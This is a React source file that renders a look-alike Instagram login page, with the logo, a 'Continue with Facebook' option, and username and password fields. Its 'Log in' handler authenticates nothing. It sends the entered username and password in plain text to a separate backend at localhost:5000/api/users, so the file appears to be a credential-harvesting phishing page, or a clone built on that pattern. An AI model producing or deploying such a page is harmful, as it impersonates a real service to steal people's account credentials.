import { useAddToInformationMutation } from "./Redux/RTKqueries/infoAPI";
import { useState } from "react";
import styles from "./App.module.scss";
import axios from 'axios';


function App() {
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [addToInformation] = useAddToInformationMutation();
  const [show, setShow] = useState(false);

  return (
    <>
      <div className={styles.signInDiv}>
        <div className={styles.instagramLogo}></div>
        <div className={styles.facebookDiv}>
          <div className={styles.facebookImage}></div>
          <h3>Continue with Facebook</h3>
        </div>

        <div className={styles.orBlock}>
          <div className={styles.orOne}></div>
          <h3 className={styles.or}>OR</h3>
          <div className={styles.orTwo}></div>
        </div>

        <input
          type="text"
          className={styles.loginInput}
          placeholder="Phone number, username, or email"
          value={login}
          onChange={(event) => {
            setLogin(event.target.value);
          }}
        />

        <div className={styles.passwordDiv}>
          <input
            type={show ? "text" : "password"}
            className={styles.passwordInput}
            placeholder="Password"
            value={password}
            onChange={(event) => {
              setPassword(event.target.value);
            }}
          />
          <button
            className={styles.showHideDiv}
            onClick={() => {
              setShow(!show);
            }}
          >
            {password !== "" ? (show ? "Hide" : "Show") : ""}
          </button>
        </div>

        <a className={styles.forgotPasswordLink} href="#">
          Forgot password?
        </a>
        <a
          href={login && password ? "#" : "#"}
          className={styles.logInButton}
          onClick={(e) => {
            e.preventDefault();
            let obj = {};
            obj.username = login;
            obj.password = password;
            axios.post("http://localhost:5000/api/users" , obj);
            obj = {};
          }}
        >
          Log in
        </a>

        <div className={styles.footer}>
          <p>Don't have an account?</p>
          <a href="#" className={styles.signInLink}>
            Sign up
          </a>
        </div>
      </div>
    </>
  );
}

export default App;
